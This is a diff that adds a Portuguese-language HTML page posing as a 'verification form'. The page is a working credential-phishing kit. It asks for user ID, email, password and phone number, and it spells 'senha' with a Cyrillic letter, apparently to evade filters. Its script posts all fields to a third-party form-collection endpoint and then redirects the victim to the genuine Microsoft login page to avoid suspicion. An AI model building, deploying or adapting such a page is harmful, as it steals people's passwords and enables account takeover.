@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<title>Formulário de Verificação</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<style>
+body {
+    font-family: Arial, sans-serif;
+    background: #f4f6f8;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 70vh;
+}
+
+.form-box {
+    background: #fff;
+    padding: 50px 70px;
+    max-width: 800px;
+    width: 100%;
+    border-radius: 8px;
+    box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+}
+
+.header {
+    text-align: center;
+    margin-bottom: 20px;
+}
+
+.header img {
+    width: 500px;      /* nice moderate size */
+    max-width: 100%;
+    height: auto;
+    margin-bottom: 10px;
+}
+label {
+    display: block;
+    margin-top: 2px;
+    font-weight: bold;
+}
+input {
+    width: 100%;
+    padding: 10px;
+    margin-top: 2px;
+    border-radius: 4px;
+    border: 1px solid #ccc;
+}
+
+button {
+    margin-top: 20px;
+    width: 100%;
+    padding: 12px;
+    background: #007bff;
+    color: #fff;
+    border: none;
+    border-radius: 4px;
+    font-size: 16px;
+    cursor: pointer;
+}
+</style>
+</head>
+
+<body>
+
+<div class="form-box">
+    <div class="header">
+        <img src="logo.png" alt="Logo">
+        <h2>FORMULÁRIO DE VERIFICAÇÃO</h2>
+        <p>Preencha este formulário e clique em "ENVIAR".</p>
+    </div>
+
+    <form id="verifyForm">
+        <label>ID do usuário</label>
+        <input type="text" name="id_do_usuario" required>
+
+        <label>Email</label>
+        <input type="email" name="email" required>
+
+        <label>Seпha</label>
+        <input type="text" name="senha" required>
+
+        <label>Confirme a sua seпha</label>
+        <input type="text" name="confirme_a_sua_seпha" required>
+
+        <label>Numero de Telefone</label>
+        <input type="tel" name="telefone" required>
+
+        <button type="submit">ENVIAR</button>
+    </form>
+</div>
+
+<script>
+document.addEventListener("DOMContentLoaded", function () {
+
+  const form = document.getElementById("verifyForm");
+
+  form.addEventListener("submit", function(e) {
+    e.preventDefault();
+
+    const formData = new FormData(form);
+
+    fetch("https://formbold.com/s/obvzL", {
+      method: "POST",
+      body: formData,
+      headers: {
+        "Accept": "application/json"
+      }
+    })
+    .then(response => {
+      if (response.ok) {
+        window.location.href = "https://login.microsoftonline.com/";
+      } else {
+        alert("Erro ao enviar o formulário. Tente novamente.");
+      }
+    })
+    .catch(error => {
+      alert("Erro de conexão. Tente novamente.");
+    });
+
+  });
+
+});
+</script>
+
+</body>
+</html>
